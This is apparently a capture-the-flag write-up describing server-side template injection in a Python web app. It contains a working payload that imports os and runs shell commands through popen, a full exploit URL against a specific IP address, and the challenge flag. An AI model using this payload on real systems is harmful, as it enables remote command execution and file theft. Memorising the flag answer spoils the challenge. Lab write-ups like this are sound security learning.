## Solve:

Initial testing (some general payloads): <br>
If you supply `?c={{7*7}}`, the server will execute it and retrieve `49` <br>
This is a sign it is vulnerable to `SSTI`  

<br><br>

## Reference to SSTI (Server Side Template Injection)
- The language used to program the application is `python`
- A good resource is [PaylodAllTheThings](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Server%20Side%20Template%20Injection/README.md)
  ```python
  {{request.application.__globals__.__builtins__.__import__('os').popen('cat flag.txt').read()}}
  ```
  
- The final payload: <br>
http://213.177.18.70:8005/?c={{request.application.__globals__.__builtins__.__import__(%27os%27).popen(%27cat%20/flag.txt%27).read()}}

<br>

## Flag:
`flag{Server_Side_Template_Injection_is_4_cool_kids_only}`
